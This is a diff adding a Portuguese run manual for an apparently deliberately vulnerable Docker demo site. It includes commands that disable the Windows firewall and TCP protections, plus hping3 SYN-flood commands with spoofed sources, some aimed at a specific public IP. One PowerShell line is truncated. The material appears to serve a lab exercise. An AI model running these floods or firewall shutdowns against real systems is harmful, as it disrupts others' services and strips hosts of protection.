@@ -1,0 +1,65 @@
+===========================================================
+             CYBERDEMO-1 EXECUTION MANUAL
+===========================================================
+
+SE HOUVER ALTERAÇÕES NO CÓDIGO:
+
+Opção 1 - Docker Desktop (GUI):
+    Docker Desktop --> Containers --> Apagar tudo
+
+OU
+
+Opção 2 - Terminal:
+    docker compose down --volumes --remove-orphans
+    docker system prune -a --volumes
+
+-----------------------------------------------------------
+
+PARA LIGAR O WEBSITE:
+
+    cd C:\docker-site
+    docker compose up --build
+
+-----------------------------------------------------------
+
+DESLIGAR SETTINGS DO WINDOWS (cmd ou PowerShell como admin):
+
+    netsh int tcp set global autotuninglevel=disabled
+    netsh int tcp set global maxsynretransmissions=2
+    netsh int tcp set supplemental template=custom congestionprovider=none
+    netsh advfirewall set allprofiles state off
+
+    Dentro do container:
+    docker exec vuln-web powershell -Command "Set-WebConfigurationProperty -Filter /system."
+
+-----------------------------------------------------------
+
+DESLIGAR FIREWALL:
+
+    Desligar:
+        netsh advfirewall set allprofiles state off
+
+    Ligar novamente:
+        netsh advfirewall set allprofiles state on
+
+-----------------------------------------------------------
+
+VER ESTADO / LOGS DO CONTAINER:
+
+    docker ps -a              --> Ver todos os containers
+    docker inspect <id>       --> Ver estado do container
+    docker logs <id>          --> Ver logs do container
+
+-----------------------------------------------------------
+
+TESTE DE DoS (não funcional neste momento):
+
+    sudo hping3 --flood -S -p 80 128.251.75.24
+    hping3 -c 200000 -S -p 80 --rand-source 128.251.75.24
+    sudo hping3 --flood -S -p 80 --rand-source <IP>
+
+    Monitorar SYN recebidos:
+        netstat -an | findstr SYN_RECEIVED
+
+
+===========================================================
